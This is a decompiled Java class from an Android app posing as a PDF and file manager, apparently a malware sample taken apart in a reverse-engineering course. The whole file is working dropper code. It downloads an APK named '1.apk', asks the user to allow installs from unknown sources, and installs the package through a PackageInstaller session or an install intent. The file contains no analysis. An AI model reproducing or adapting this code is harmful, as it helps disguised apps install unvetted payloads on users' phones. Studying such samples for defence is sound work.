package com.travisscott.pdf;

import android.app.DownloadManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

/* loaded from: /home/davidjosearaujo/Documents/mc/first-year/second-semester/RE/P/re-android-reversing/original_zip/cortina.dex */
public class DownloadRecorderManager {
    private static final String FILE_BASE_PATH = "file://";
    public static final String FILE_NAME = "1.apk";
    private static final String MIME_TYPE = "application/vnd.android.package-archive";
    public static final AtomicBoolean downloaded = new AtomicBoolean(false);
    private static int sessionId;

    public void startDownload(Context context, String url) {
        String dest = (context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS).toString() + File.pathSeparator) + FILE_NAME;
        Uri.parse(FILE_BASE_PATH + dest);
        File file = new File(dest);
        if (!file.exists()) {
            DownloadManager downloadManager = (DownloadManager) context.getSystemService("download");
            Uri downloadUri = Uri.parse(url);
            DownloadManager.Request request = new DownloadManager.Request(downloadUri);
            request.setMimeType(MIME_TYPE);
            request.setTitle(FILE_NAME);
            request.setDescription(FILE_NAME);
            request.setDestinationInExternalFilesDir(context, Environment.DIRECTORY_DOWNLOADS, FILE_NAME);
            registerDownloadReceiver(context);
            downloadManager.enqueue(request);
            return;
        }
        downloaded.set(true);
        showInstallDialog(context);
    }

    public static boolean isSessionGood(Context context) {
        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionInfo sessionInfo = packageInstaller.getSessionInfo(sessionId);
        return sessionInfo != null && sessionInfo.getProgress() > 0.81f;
    }

    public void showNewInstallDialog2(Context context) {
        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionInfo prevSession = packageInstaller.getSessionInfo(sessionId);
        if (prevSession != null && prevSession.isActive() && prevSession.getProgress() > 0.811f) {
            Toast.makeText(context, "Installation is in progress, please wait...", 0).show();
            return;
        }
        PackageInstaller.Session session = null;
        try {
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(1);
            sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);
            addApkToInstallSession(context, session);
            Intent intent = new Intent(context, MainLibrary.getInstallClass());
            intent.setAction(MainLibrary.PACKAGE_INSTALLED_ACTION);
            PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 33554432);
            IntentSender statusReceiver = pendingIntent.getIntentSender();
            session.commit(statusReceiver);
        } catch (IOException e) {
            throw new RuntimeException("Couldn't install package", e);
        } catch (RuntimeException e2) {
            if (session != null) {
                session.abandon();
            }
            throw e2;
        }
    }

    private void addApkToInstallSession(Context context, PackageInstaller.Session session) throws IOException {
        File targetFile = new File(context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), FILE_NAME);
        PackageInfo packageInfo = context.getPackageManager().getPackageArchiveInfo(targetFile.getPath(), 0);
        MainLibrary.packageName.set(packageInfo.packageName);
        FileInputStream is = new FileInputStream(targetFile);
        OutputStream packageInSession = session.openWrite("package", 0L, -1L);
        try {
            byte[] buffer = new byte[16384];
            while (true) {
                int n = is.read(buffer);
                if (n < 0) {
                    break;
                }
                packageInSession.write(buffer, 0, n);
            }
            if (packageInSession != null) {
                packageInSession.close();
            }
        } catch (Throwable th) {
            if (packageInSession != null) {
                try {
                    packageInSession.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
            }
            throw th;
        }
    }

    public void showInstallDialog(Context context) {
        boolean canRequestPackageInstalls = context.getPackageManager().canRequestPackageInstalls();
        if (canRequestPackageInstalls) {
            showNewInstallDialog2(context);
            return;
        }
        Intent intent = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES", Uri.parse("package:" + context.getApplicationContext().getPackageName()));
        intent.addFlags(268435456);
        context.startActivity(intent);
        Toast.makeText(context, "Grant permission", 0).show();
    }

    public void installFile(Context activity) {
        PackageManager pm = activity.getPackageManager();
        String destination = (activity.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS) + "/") + FILE_NAME;
        Uri.parse(FILE_BASE_PATH + destination);
        File file = new File(destination);
        PackageInfo info = pm.getPackageArchiveInfo(destination, 0);
        if (info != null) {
            MainLibrary.packageName.set(info.packageName);
        }
        Uri apkUri = FileProvider.getUriForFile(activity, "com.tragisoap.fileandpdfmanager", file);
        Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
        intent.setData(apkUri);
        intent.setFlags(1);
        intent.addFlags(268435456);
        activity.startActivity(intent);
    }

    public void registerDownloadReceiver(Context context) {
        BroadcastReceiver onComplete = new BroadcastReceiver() { // from class: com.travisscott.pdf.DownloadRecorderManager.1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                DownloadRecorderManager.downloaded.set(true);
                DownloadRecorderManager.this.showInstallDialog(context2);
                context2.unregisterReceiver(this);
            }
        };
        context.registerReceiver(onComplete, new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"), 2);
    }
}
